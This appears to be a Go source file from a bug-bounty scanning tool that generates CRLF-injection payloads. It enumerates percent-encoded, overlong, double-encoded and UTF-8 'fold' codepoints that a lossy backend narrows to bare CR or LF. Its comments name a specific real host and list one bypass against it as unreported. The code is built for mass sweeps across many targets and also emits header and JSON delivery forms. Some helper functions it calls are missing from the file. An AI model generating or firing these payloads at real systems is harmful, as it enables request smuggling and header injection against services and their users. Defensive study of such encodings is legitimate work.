// Package vectors is the FLAMER stage: it generates the malformed encodings that a
// vulnerable stack may fold into a bare CR or LF.
//
// THE RULE. Every confirmed bypass in the 8x8 voapi report chain — spanning 2023-03 to
// 2025-12, five separate patches, six paid criticals — obeys one rule:
//
//	a codepoint whose LEAST-SIGNIFICANT BYTE is 0x0A (or 0x0D)
//	survives a lossy 32->8 or 16->8 narrowing in the backend.
//
//	%0A          U+000A   raw
//	%C4%8A       U+010A   Ċ        (Frans Rosen)
//	%DC%8A       U+070A   ܊        (Syriac; the newest bypass)
//	%E0%AC%8A    U+0B0A   ଊ        (Oriya)
//	%E5%98%8A    U+560A   嘊       (the classic double-encoding)
//	%F0%9F%98%8A U+1F60A  😊
//
// PortSwigger's flamer documents the same primitive from the other side — "a server
// decodes UTF-8 then truncates codepoints mod-256" — but delivers it as raw wire bytes
// in a header. This package delivers it PERCENT-ENCODED IN THE PATH, which reaches a
// different gadget: an application that URL-decodes the path and reforwards it into a
// backend request line. Nobody has enumerated that space, so this generates all of it
// rather than shipping the six payloads that happen to be public.
//
// A blacklist patch can only ever remove points from this set. The set is the reason
// the same host paid out five times.
package vectors

import (
	"fmt"
	"sort"
	"strings"
	"unicode/utf8"
)

// Class is the control character a vector is trying to become.
type Class string

const (
	ClassLF   Class = "lf"
	ClassCR   Class = "cr"
	ClassCRLF Class = "crlf"
)

// Family is how the vector tries to get there.
type Family string

const (
	// FamilyRaw is the unobfuscated control character. It is the control probe: if a
	// target answers it, the target was never patched and the fold families prove nothing.
	FamilyRaw Family = "raw"

	// FamilyFold is the core family: a legal UTF-8 codepoint whose low byte is the
	// target control character, relying on a narrowing conversion downstream.
	FamilyFold Family = "utf8-fold"

	// FamilyOverlong is a non-shortest-form UTF-8 encoding of the control character
	// itself. Strict decoders reject it; permissive ones emit the raw byte.
	FamilyOverlong Family = "overlong"

	// FamilyDouble survives one decode pass as a literal percent-escape and becomes
	// the control character on the second — the classic two-tier proxy/app split.
	FamilyDouble Family = "double-encoded"
)

// Tier bounds scan cost. A full sweep of the fold space is ~4,700 vectors, which at a
// polite one request per second is over an hour per target — unusable across a scope of
// tens of thousands of hosts. Tier 1 is the everything-sweep; higher tiers are for hosts
// that already showed a transformation.
const (
	TierQuick    = 1 // ~35 vectors: raw, all 2-byte folds, overlongs, double-encodings, known 3-byte
	TierStandard = 2 // + every 3-byte fold (U+0800..U+FFFF)
	TierFull     = 3 // + 4-byte folds (astral plane)
)

// Vector is one generated encoding.
type Vector struct {
	ID        string `json:"id"`
	Family    Family `json:"family"`
	Class     Class  `json:"class"`
	Codepoint string `json:"codepoint,omitempty"` // "U+070A"
	Encoded   string `json:"encoded"`             // "%DC%8A" — goes in the request path verbatim
	// Control is the matched negative: the identical construction one value higher, so
	// it has the same length and shape but does not fold to a control character. The
	// differential is Encoded vs Control, never Encoded vs "/".
	Control string `json:"control"`
	// WireBytes is what a decoder receives: the percent-decoded form, hex, space-separated.
	// It is what to write into a header value, where nothing URL-decodes for you.
	WireBytes string `json:"wire_bytes"`
	// JSONEsc is the same codepoint as a JSON string escape. A JSON parser decodes
	// "\u070a" to U+070A and the mod-256 narrowing happens downstream of that, so a JSON
	// body is a first-class delivery context, not an afterthought.
	JSONEsc string `json:"json_escape,omitempty"`
	Tier    int    `json:"tier"`
	Known   bool   `json:"known"` // confirmed working somewhere in the wild
	Note    string `json:"note,omitempty"`
}

// known maps a codepoint to the report or source that confirmed it, so a hit on a known
// vector can be told apart from a genuinely new one.
var known = map[rune]string{
	0x000A:  "raw LF — H1 #1893764",
	0x000D:  "raw CR",
	0x010A:  "Ċ — Frans Rosen / H1 #2704607",
	0x010D:  "č — PortSwigger flamer request-format docs (folds to CR)",
	0x070A:  "܊ Syriac — newest voapi.8x8.com bypass, unreported",
	0x0B0A:  "ଊ Oriya — H1 #3340283",
	0x560A:  "嘊 — H1 #2095676",
	0x1F60A: "😊 — H1 #3340283 (astral, same rule)",
}

// Generate returns every vector at or below the requested tier, deduplicated and in a
// stable order. classes selects which control characters to target; nil means both.
func Generate(tier int, classes []Class) []Vector {
	if len(classes) == 0 {
		classes = []Class{ClassLF, ClassCR}
	}
	want := map[byte]Class{}
	for _, c := range classes {
		switch c {
		case ClassLF:
			want[0x0A] = ClassLF
		case ClassCR:
			want[0x0D] = ClassCR
		}
	}

	var out []Vector
	seen := map[string]bool{}
	add := func(v Vector) {
		if v.Encoded == "" || seen[v.Encoded] {
			return
		}
		seen[v.Encoded] = true
		out = append(out, v)
	}

	for low, class := range want {
		lowR := rune(low)

		// FamilyRaw — the control probe. If a target answers this, it was never
		// patched, and a hit on any fold family proves nothing new.
		add(Vector{
			ID: fmt.Sprintf("raw-%s", class), Family: FamilyRaw, Class: class,
			Codepoint: fmt.Sprintf("U+%04X", low),
			Encoded:   encRaw(lowR), Control: encRaw(lowR + 1),
			WireBytes: hexOf([]byte{low}), Tier: TierQuick, Known: true,
			Note: known[lowR],
		})

		for _, n := range []int{2, 3, 4} {
			add(Vector{
				ID: fmt.Sprintf("overlong%d-%s", n, class), Family: FamilyOverlong, Class: class,
				Codepoint: fmt.Sprintf("U+%04X", low),
				Encoded:   encOverlong(n, lowR), Control: encOverlong(n, lowR+1),
				WireBytes: hexOf(mustDecode(encOverlong(n, lowR))), Tier: TierQuick,
				Note: fmt.Sprintf("%d-byte overlong form", n),
			})
		}

		for _, f := range []int{1, 2, 3} {
			add(Vector{
				ID: fmt.Sprintf("double%d-%s", f, class), Family: FamilyDouble, Class: class,
				Encoded: encDouble(f, lowR), Control: encDouble(f, lowR+1),
				Tier: TierQuick, Note: "requires two decode passes",
			})
		}

		// FamilyFold — the main event.
		for cp := lowR + 0x100; cp <= 0x10FFFF; cp += 0x100 {
			if cp >= 0xD800 && cp <= 0xDFFF {
				continue
			}
			note, isKnown := known[cp]
			t := tierOf(cp)
			// A publicly-confirmed vector is the highest-prior-probability payload in
			// the whole space and must be in the cheapest sweep, whatever its encoded
			// length. Tagging it tier 1 after the fact never worked: generation had
			// already skipped it.
			if isKnown {
				t = TierQuick
			}
			if t > tier {
				continue
			}
			add(Vector{
				ID: fmt.Sprintf("fold-%s-u%04x", class, cp), Family: FamilyFold, Class: class,
				Codepoint: fmt.Sprintf("U+%04X", cp),
				Encoded:   encFold(cp), Control: encFold(cp + 1),
				WireBytes: hexOf([]byte(string(cp))), Tier: t, Known: isKnown, Note: note,
			})
		}
	}

	for i := range out {
		wire := decodePercent(out[i].Encoded)
		out[i].WireBytes = hexOf(wire)
		out[i].JSONEsc = jsonEscape(wire)
	}

	sort.Slice(out, func(i, j int) bool {
		if out[i].Tier != out[j].Tier {
			return out[i].Tier < out[j].Tier
		}
		if out[i].Known != out[j].Known {
			return out[i].Known
		}
		return out[i].ID < out[j].ID
	})
	return out
}

// tierOf assigns a codepoint to a scan tier by its UTF-8 length.
func tierOf(cp rune) int {
	switch {
	case cp < 0x800:
		return TierQuick
	case cp < 0x10000:
		return TierStandard
	default:
		return TierFull
	}
}

func pct(b []byte) string {
	var sb strings.Builder
	for _, c := range b {
		fmt.Fprintf(&sb, "%%%02X", c)
	}
	return sb.String()
}

// decodePercent applies one percent-decode pass, giving the bytes a server sees after it
// unescapes the path — which is the input the narrowing conversion actually operates on.
func decodePercent(s string) []byte {
	var out []byte
	for i := 0; i < len(s); i++ {
		if s[i] == '%' && i+2 < len(s) {
			var v int
			if _, err := fmt.Sscanf(s[i+1:i+3], "%02x", &v); err == nil {
				out = append(out, byte(v))
				i += 2
				continue
			}
		}
		out = append(out, s[i])
	}
	return out
}

// jsonEscape renders the bytes as a JSON string fragment. Valid UTF-8 becomes a \uXXXX
// escape of the codepoint (with a surrogate pair above the BMP); anything else — overlong
// forms, bare control bytes — falls back to per-byte escapes.
func jsonEscape(b []byte) string {
	if r, size := utf8.DecodeRune(b); r != utf8.RuneError && size == len(b) {
		if r > 0xFFFF {
			r -= 0x10000
			return fmt.Sprintf("\\u%04x\\u%04x", 0xD800+(r>>10), 0xDC00+(r&0x3FF))
		}
		return fmt.Sprintf("\\u%04x", r)
	}
	var sb strings.Builder
	for _, c := range b {
		fmt.Fprintf(&sb, "\\u%04x", c)
	}
	return sb.String()
}

// mustDecode turns a percent-encoded string back into wire bytes, for the WireBytes
// field. Only ever called on strings this package just produced.
func mustDecode(s string) []byte {
	var out []byte
	for i := 0; i+2 < len(s); i += 3 {
		var v int
		fmt.Sscanf(s[i:i+3], "%%%02x", &v)
		out = append(out, byte(v))
	}
	return out
}

func hexOf(b []byte) string {
	parts := make([]string, len(b))
	for i, c := range b {
		parts[i] = fmt.Sprintf("%02x", c)
	}
	return strings.Join(parts, " ")
}
